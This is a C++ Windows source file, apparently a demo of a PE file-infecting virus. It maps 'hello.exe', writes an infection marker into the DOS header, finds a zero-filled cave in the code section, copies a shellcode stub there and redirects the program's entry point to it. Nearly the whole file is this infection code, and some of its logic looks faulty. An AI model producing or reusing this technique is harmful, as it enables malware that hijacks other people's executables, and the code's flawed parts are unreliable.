// FindSpace.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>
#include <stddef.h>

char shellcode[] = "\x90\x90\x90\x90\xb8\x90\x90\x90\x90\xff\xe0\x00";

// 这里是搜索的缝隙的代码
// 缝隙的搜索从代码节的末尾开始搜索
// 有利于快速搜索到缝隙
DWORD FindSpace(LPVOID lpBase, PIMAGE_NT_HEADERS pNtHeader)
{
    PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)
                        (((BYTE *)&(pNtHeader->OptionalHeader) + pNtHeader->FileHeader.SizeOfOptionalHeader));

    DWORD dwAddr = pSec->PointerToRawData + pSec->SizeOfRawData - sizeof(shellcode);
    dwAddr = (DWORD)(BYTE *)lpBase + dwAddr;

    LPVOID lp = malloc(sizeof(shellcode));
    memset(lp, 0, sizeof(shellcode));

    while ( dwAddr > pSec->Misc.VirtualSize )
    {
        int nRet = memcmp((LPVOID)dwAddr, lp, sizeof(shellcode));
        if ( nRet == 0 )
        {
            return dwAddr;
        }

        dwAddr --;
    }

    free(lp);

    return 0;
}

BOOL WriteSig(DWORD dwAddr, DWORD dwSig, HANDLE hFile)
{    
    DWORD dwNum = 0;
    
    SetFilePointer(hFile, dwAddr, 0, FILE_BEGIN);
    WriteFile(hFile, &dwSig, sizeof(DWORD), &dwNum, NULL);
    
    return TRUE;
}

BOOL CheckSig(DWORD dwAddr, DWORD dwSig, HANDLE hFile)
{  
    DWORD dwSigNum = 0;
    DWORD dwNum = 0;
    SetFilePointer(hFile, dwAddr, 0, FILE_BEGIN);
    ReadFile(hFile, &dwSigNum, sizeof(DWORD), &dwNum, NULL);
    
    if ( dwSigNum == dwSig )
    {
        return TRUE;
    }
       
    return FALSE;
}

#define VIRUSFLAGS 0xCCCC

int main(int argc, char* argv[])
{
    HANDLE hFile = NULL;
    HANDLE hMap = NULL;
    LPVOID lpBase = NULL;

    hFile = CreateFile("hello.exe", 
                       GENERIC_READ | GENERIC_WRITE,
                       FILE_SHARE_READ,
                       NULL,
                       OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL,
                       NULL);

    hMap = CreateFileMapping(hFile,
                             NULL,
                             PAGE_READWRITE,
                             0,
                             0,
                             0);

    lpBase = MapViewOfFile(hMap,
                           FILE_MAP_READ | FILE_MAP_WRITE,
                           0,
                           0,
                           0);

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBase;

    PIMAGE_NT_HEADERS pNtHeader = NULL;

    PIMAGE_SECTION_HEADER pSec = NULL;


    IMAGE_SECTION_HEADER imgSec = { 0 };

    if ( pDosHeader->e_magic != IMAGE_DOS_SIGNATURE )
    {
        UnmapViewOfFile(lpBase);
        CloseHandle(hMap);
        CloseHandle(hFile);
        return -1;
    }

    pNtHeader = (PIMAGE_NT_HEADERS)((BYTE*)lpBase + pDosHeader->e_lfanew);

    if ( pNtHeader->Signature != IMAGE_NT_SIGNATURE )
    {
        UnmapViewOfFile(lpBase);
        CloseHandle(hMap);
        CloseHandle(hFile);

        return -1;
    }

    // 返回真说明感染过
    if ( CheckSig(offsetof(IMAGE_DOS_HEADER, e_cblp), VIRUSFLAGS, hFile) )
    {
        MessageBox(NULL, "已经感染过来，换个感染吧!!!", NULL, MB_OK);
        return -1;
    }
    
    // 写入感染标志
    WriteSig(offsetof(IMAGE_DOS_HEADER, e_cblp), VIRUSFLAGS, hFile);

    DWORD dwAddr = FindSpace(lpBase, pNtHeader);

    // 原入口地址
    DWORD dwOep = pNtHeader->OptionalHeader.ImageBase + pNtHeader->OptionalHeader.AddressOfEntryPoint;
    *(DWORD *)&shellcode[5] = dwOep;

    memcpy((char *)dwAddr, shellcode, strlen(shellcode) + 3);

    dwAddr = dwAddr - (DWORD)(BYTE *)lpBase;

    // 新入口地址
    pNtHeader->OptionalHeader.AddressOfEntryPoint = dwAddr;

    UnmapViewOfFile(lpBase);
    CloseHandle(hMap);
    CloseHandle(hFile);


	return 0;
}
